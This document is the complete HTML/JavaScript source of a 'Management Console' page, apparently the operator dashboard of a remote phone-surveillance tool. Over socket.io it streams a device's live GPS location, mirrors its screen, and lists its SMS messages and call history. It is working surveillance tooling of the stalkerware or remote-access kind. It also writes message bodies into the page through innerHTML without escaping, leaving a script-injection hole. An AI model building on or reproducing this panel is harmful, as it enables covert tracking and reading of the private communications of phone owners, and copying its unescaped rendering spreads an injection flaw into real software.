<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Management Console</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        :root { --sidebar-bg: #2c3e50; --accent: #1abc9c; --dark: #34495e; --danger: #e74c3c; --success: #2ecc71; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; background: #f4f7f6; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 250px; background: var(--sidebar-bg); color: white; height: 100vh; position: fixed; z-index: 10; display:flex; flex-direction:column; }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #3e4f5f; transition: 0.2s; display: flex; align-items: center; gap: 10px; }
        .nav-item:hover, .active { background: #1a252f; color: var(--accent); border-left: 4px solid var(--accent); }

        /* Main Content */
        .main-content { margin-left: 250px; flex: 1; display: flex; flex-direction: column; height: 100vh; }
        
        /* Top Nav & Connection Status */
        .top-nav { height: 70px; background: white; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); transition: background 0.3s; }
        
        /* Connection Status States */
        .status-connected { border-bottom: 4px solid var(--success); }
        .status-disconnected { background: #fadbd8 !important; border-bottom: 4px solid var(--danger); }

        /* GPS Info Truncation */
        .gps-box { display: flex; align-items: center; gap: 8px; max-width: 50%; }
        #addr-text { font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin: 0; color: var(--dark); }

        /* Battery Box */
        .battery-pill { background: #ecf0f1; padding: 6px 15px; border-radius: 20px; font-weight: bold; display: flex; align-items: center; gap: 8px; border: 1px solid #bdc3c7; }
        .charging-active { background: #d4efdf; color: #27ae60; border-color: #27ae60; }

        /* Views */
        .view { display: none; padding: 30px; overflow-y: auto; flex: 1; }
        .view.active { display: block; animation: fadeIn 0.3s; }
        
        /* Map View */
        #map { height: 500px; width: 100%; border-radius: 12px; margin-top: 20px; border: 2px solid #ddd; }
        
        /* Screen Mirror View */
        .screen-wrapper { display: flex; flex-direction: column; align-items: center; background: #000; padding: 20px; border-radius: 15px; max-width: 400px; margin: 0 auto; border: 4px solid var(--dark); }
        #screen-img { width: 100%; height: auto; border-radius: 8px; display: none; }
        .placeholder-text { color: #7f8c8d; text-align: center; padding: 40px; }

        /* Controls */
        .control-bar { margin-bottom: 15px; display: flex; gap: 10px; }
        .btn { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; transition: 0.2s; }
        .btn-start { background: var(--accent); }
        .btn-start:hover { background: #16a085; }
        .btn-stop { background: var(--danger); }
        .btn-stop:hover { background: #c0392b; }

        /* Tables */
        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        th { background: var(--dark); color: white; padding: 12px; text-align: left; }
        td { padding: 12px; border-bottom: 1px solid #eee; }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="sidebar">
    <div style="padding:25px; background:var(--accent); font-weight:bold; font-size: 1.1em; text-align: center;">CONTROL PANEL</div>
    
    <div class="nav-item active" onclick="showView('dash')">üìä Dashboard</div>
    <div class="nav-item" onclick="showView('tracking')">üåç Live Tracking</div>
    <div class="nav-item" onclick="showView('screen')">üì± Screen Mirror</div>
    <div class="nav-item" onclick="showView('sms')">üí¨ SMS Messages</div>
    <div class="nav-item" onclick="showView('calls')">üìû Call History</div>
</div>

<div class="main-content">
    <div id="top-bar" class="top-nav status-disconnected">
        <div class="gps-box">
            <span>üìç</span>
            <p id="addr-text">Waiting for connection...</p>
        </div>
        
        <div id="battery-box" class="battery-pill">
            <span id="bolt" style="display:none;">‚ö°</span>
            <span id="pct">--</span>%
            <span>üîã</span>
        </div>
    </div>

    <div id="dash" class="view active">
        <h2>Device Overview</h2>
        <p>Select an option from the left sidebar to begin monitoring.</p>
        <div style="display: flex; gap: 20px; margin-top: 20px;">
            <div style="background: white; padding: 20px; border-radius: 8px; flex: 1; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
                <h3>Status</h3>
                <p id="connection-status" style="color: var(--danger); font-weight: bold;">Disconnected</p>
            </div>
        </div>
    </div>

    <div id="tracking" class="view">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h2>Live Location</h2>
            <div class="control-bar">
                <button class="btn btn-start" onclick="toggleGps(true)">‚ñ∂ Start Live Stream</button>
                <button class="btn btn-stop" onclick="toggleGps(false)">‚èπ Stop Stream</button>
            </div>
        </div>
        <p style="color: #7f8c8d; font-size: 0.9em;">Click "Start" to force high-frequency updates from the device.</p>
        <div id="map"></div>
    </div>

    <div id="screen" class="view">
        <div class="screen-wrapper">
            <div style="width: 100%; display: flex; justify-content: space-between; margin-bottom: 10px; color: white;">
                <span>Mobile View</span>
                <span id="screen-state">OFFLINE</span>
            </div>
            
            <div style="width: 100%; min-height: 500px; background: #222; display: flex; align-items: center; justify-content: center; border-radius: 8px; overflow: hidden;">
                <div id="placeholder" class="placeholder-text">
                    Stream Inactive<br>
                    <small>Click "Start Mirror" below</small>
                </div>
                <img id="screen-img" src="" alt="Live Stream" />
            </div>

            <div class="control-bar" style="margin-top: 20px; width: 100%; justify-content: center;">
                <button class="btn btn-start" style="width: 45%" onclick="toggleScreen(true)">Start Mirror</button>
                <button class="btn btn-stop" style="width: 45%" onclick="toggleScreen(false)">Stop</button>
            </div>
        </div>
    </div>

    <div id="sms" class="view">
        <h2>SMS Logs</h2>
        <table><thead><tr><th>Type</th><th>From/To</th><th>Message</th><th>Time</th></tr></thead><tbody id="sms-table"></tbody></table>
    </div>

    <div id="calls" class="view">
        <h2>Call History</h2>
        <table><thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Time</th></tr></thead><tbody id="calls-table"></tbody></table>
    </div>
</div>

<script>
    const socket = io();
    let map, marker, circle;

    // --- Connection Status Logic ---
    socket.on('connect', () => {
        document.getElementById('top-bar').classList.remove('status-disconnected');
        document.getElementById('top-bar').classList.add('status-connected');
        document.getElementById('connection-status').innerText = "Connected";
        document.getElementById('connection-status').style.color = "var(--success)";
        document.getElementById('addr-text').innerText = "Device Connected. Waiting for GPS...";
    });

    socket.on('disconnect', () => {
        document.getElementById('top-bar').classList.remove('status-connected');
        document.getElementById('top-bar').classList.add('status-disconnected');
        document.getElementById('connection-status').innerText = "Disconnected";
        document.getElementById('connection-status').style.color = "var(--danger)";
        document.getElementById('addr-text').innerText = "Connection Lost";
    });

    // --- Sidebar Navigation ---
    function showView(id) {
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        
        document.getElementById(id).classList.add('active');
        // Find the nav item that calls this function and activate it (approximation)
        const navItems = document.querySelectorAll('.nav-item');
        if(id === 'dash') navItems[0].classList.add('active');
        if(id === 'tracking') navItems[1].classList.add('active');
        if(id === 'screen') navItems[2].classList.add('active');
        if(id === 'sms') { navItems[3].classList.add('active'); socket.emit('get-sms-request'); }
        if(id === 'calls') { navItems[4].classList.add('active'); socket.emit('get-calls-request'); }
        
        // Fix map rendering if hidden
        if(id === 'tracking' && map) setTimeout(() => map.invalidateSize(), 300);
    }

    // --- Live Tracking Logic ---
    function toggleGps(active) {
        if(active) {
            socket.emit('start-gps-stream'); // Requires server relay
            alert("Requested high-frequency GPS updates.");
        } else {
            socket.emit('stop-gps-stream');
        }
    }

    socket.on('ui-gps', (data) => {
        document.getElementById('addr-text').innerText = data.address || `Lat: ${data.lat}`;
        
        if (!map) {
            map = L.map('map').setView([data.lat, data.lng], 16);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        }
        
        if (marker) map.removeLayer(marker);
        marker = L.circleMarker([data.lat, data.lng], {
            radius: 10, 
            color: '#fff', 
            fillColor: '#3498db', 
            fillOpacity: 1
        }).addTo(map);
        
        map.setView([data.lat, data.lng]);
    });

    // --- Screen Mirror Logic ---
    function toggleScreen(active) {
        if(active) {
            socket.emit('request-screen-view');
            document.getElementById('placeholder').innerHTML = "Connecting...";
            document.getElementById('screen-state').innerText = "REQUESTING...";
        } else {
            socket.emit('stop-mirroring');
            document.getElementById('screen-img').style.display = 'none';
            document.getElementById('placeholder').style.display = 'block';
            document.getElementById('placeholder').innerHTML = "Stream Inactive";
            document.getElementById('screen-state').innerText = "OFFLINE";
        }
    }

    socket.on('ui-screen-stream', (base64) => {
        document.getElementById('placeholder').style.display = 'none';
        const img = document.getElementById('screen-img');
        img.style.display = 'block';
        img.src = "data:image/jpeg;base64," + base64;
        document.getElementById('screen-state').innerText = "LIVE";
        document.getElementById('screen-state').style.color = "var(--success)";
    });

    socket.on('screen-status', (status) => {
        if(status === "OFF") {
            alert("‚ö†Ô∏è Screen is OFF on device. Cannot mirror.");
            document.getElementById('screen-state').innerText = "SCREEN OFF";
        }
    });

    // --- Battery Logic ---
    socket.on('ui-battery', (data) => {
        document.getElementById('pct').innerText = data.percent;
        const box = document.getElementById('battery-box');
        const bolt = document.getElementById('bolt');
        
        if (data.charging) {
            bolt.style.display = "inline";
            box.classList.add('charging-active');
        } else {
            bolt.style.display = "none";
            box.classList.remove('charging-active');
        }
    });

    // --- Logs ---
    socket.on('ui-sms-display', (data) => {
        document.getElementById('sms-table').innerHTML = data.map(m => `<tr><td>${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
    });

    socket.on('ui-calls-display', (data) => {
        document.getElementById('calls-table').innerHTML = data.map(c => `<tr><td>${c.type}</td><td>${c.name||'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
    });
</script>
</body>
</html>
